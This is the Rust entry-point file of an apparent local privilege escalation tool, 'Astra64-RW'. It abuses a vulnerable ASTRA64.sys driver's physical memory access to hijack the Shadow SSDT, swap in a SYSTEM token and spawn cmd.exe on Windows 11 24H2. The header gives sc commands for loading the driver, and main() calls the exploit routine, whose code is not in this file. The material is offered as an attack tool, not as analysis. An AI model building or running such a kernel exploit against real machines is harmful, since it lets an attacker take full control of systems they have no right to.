//! Astra64-RW — kernel R/W via `ASTRA64.sys` (`\Device\PhysicalMemory`).
//!
//! Shadow SSDT hijack → SYSTEM token swap → spawn cmd.exe.
//!
//! Driver lifecycle is NOT managed by this tool. Load `ASTRA64.sys` yourself
//! before running:
//!
//!     sc create ASTRA64 type= kernel binPath= "C:\path\to\ASTRA64.sys"
//!     sc start  ASTRA64
//!
//! When you're done:
//!
//!     sc stop   ASTRA64
//!     sc delete ASTRA64

#![allow(non_snake_case, non_camel_case_types, dead_code)]

mod astra;
mod kernel;
mod lpe;
mod pe;

fn main() {
    println!();
    println!("  [~] Astra64-RW — kernel R/W via \\Device\\PhysicalMemory");
    println!("  [~] Target: Windows 11 24H2 with VBS / HVCI / kCET");
    println!();

    let ok = match lpe::run_lpe() {
        Ok(b) => b,
        Err(e) => { eprintln!("[-] {e}"); false }
    };

    if !ok { std::process::exit(1); }
}
